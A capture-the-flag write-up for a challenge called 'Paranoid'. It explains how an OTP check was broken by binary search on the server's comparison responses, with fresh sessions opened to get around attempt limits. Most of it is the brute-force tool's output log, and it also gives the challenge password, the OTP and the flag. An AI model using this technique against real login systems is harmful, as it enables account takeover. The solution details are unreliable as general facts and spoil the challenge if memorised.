# Paranoid ⭐⭐⭐

[< Go back](../../README.md)

## Description

I made this cool website, but I don't trust any of those lousy package maintainers to handle my password securily.
So, I developed my own library.
I know it's security because it uses MFA.

The [paranoid/](./paranoid/) folder was provided and an URL

## Challenge

I've setup a local environment for testing. This will allow us to view customize the server code into a way to helps us debug and create a brute-force tool.

I came up with [bruteforce.py](./bruteforce.py) to crack the OTP.

For the first step related to the password cracking, due to the fact there were less limitations, the process is a little bit more straight forward, and I could have adatped my tool to also handle the password cracking, but because of time constraints I rolled with the fact that @vhseffect had already brute forced the password. (i.e. "MonkeyBrain")

### Cracking

The tool is a simple binary search algorithm, I implemented it recursively for the lols, it wasn' really necessary to do so, but it's been some time since I did any programming challenge like this, so I wanted to have some fun.

The tool actually handles pretty much anything that could happen gracefully, due to time limitations, or max attempt if the server blocks us, the bruteforce script just rolls back and generates a completely new guid session with the password and tries again.

```
Got GUID: /33169135-1740-4950-ae6f-94dc7cea2d70

[*] Attempting OTP: V (State: 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 49: -1

[*] Attempting OTP: F (State: 0123456789ABCDEFGHIJKLMNOPQRSTU)
[!] Invalid OTP. Tries left: 48: 1

[*] Attempting OTP: N (State: FGHIJKLMNOPQRSTU)
[!] Invalid OTP. Tries left: 47: -1

[*] Attempting OTP: J (State: FGHIJKLM)
[!] Invalid OTP. Tries left: 46: 1

[*] Attempting OTP: L (State: JKLM)
[!] Invalid OTP. Tries left: 45: 1

[*] Attempting OTP: M (State: LM)
[!] Invalid OTP. Tries left: 44: -1

[*] Attempting OTP: LV (State: 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 43: 1

[*] Attempting OTP: Lk (State: VWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 42: -1

[*] Attempting OTP: Lc (State: VWXYZabcdefghij)
[!] Invalid OTP. Tries left: 41: 1

[*] Attempting OTP: Lg (State: cdefghij)
[!] Invalid OTP. Tries left: 40: 1

[*] Attempting OTP: Li (State: ghij)
[!] Invalid OTP. Tries left: 39: -1

[*] Attempting OTP: Lh (State: gh)
[!] Invalid OTP. Tries left: 38: -1

[*] Attempting OTP: LgV (State: 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 37: 1

[*] Attempting OTP: Lgk (State: VWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 36: 1

[*] Attempting OTP: Lgs (State: klmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 35: 1

[*] Attempting OTP: Lgw (State: stuvwxyz)
[!] Invalid OTP. Tries left: 34: -1

[*] Attempting OTP: Lgu (State: stuv)
[!] Invalid OTP. Tries left: 33: -1

[*] Attempting OTP: Lgt (State: st)
[!] Invalid OTP. Tries left: 32: -1

[*] Attempting OTP: LgsV (State: 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 31: 1

[*] Attempting OTP: Lgsk (State: VWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 30: -1

[*] Attempting OTP: Lgsc (State: VWXYZabcdefghij)
[!] Invalid OTP. Tries left: 29: -1

[*] Attempting OTP: LgsY (State: VWXYZab)
[!] Invalid OTP. Tries left: 28: -1

[*] Attempting OTP: LgsW (State: VWX)
[!] Invalid OTP. Tries left: 27: 1

[*] Attempting OTP: LgsX (State: WX)
[!] Invalid OTP. Tries left: 26: 1

[*] Attempting OTP: LgsXV (State: 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 25: 1

[*] Attempting OTP: LgsXk (State: VWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 24: 1

[*] Attempting OTP: LgsXs (State: klmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 23: -1

[*] Attempting OTP: LgsXo (State: klmnopqr)
[!] Invalid OTP. Tries left: 22: -1

[*] Attempting OTP: LgsXm (State: klmn)
[!] Invalid OTP. Tries left: 21: 1

[*] Attempting OTP: LgsXn (State: mn)
[!] Invalid OTP. Tries left: 20: -1

[*] Attempting OTP: LgsXmV (State: 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)
[!] Invalid OTP. Tries left: 19: -1

[*] Attempting OTP: LgsXmF (State: 0123456789ABCDEFGHIJKLMNOPQRSTU)
[!] Invalid OTP. Tries left: 18: -1

[*] Attempting OTP: LgsXm7 (State: 0123456789ABCDE)
[!] Invalid OTP. Tries left: 17: 1

[*] Attempting OTP: LgsXmB (State: 789ABCDE)
[!] Invalid OTP. Tries left: 16: 1

[*] Attempting OTP: LgsXmD (State: BCDE)
[*] Found OTP: LgsXmD
[*] Flag: CSC{Al9ORi7hMic5_cLa22_Wa5_Co0L_aF73R_AlL}
```
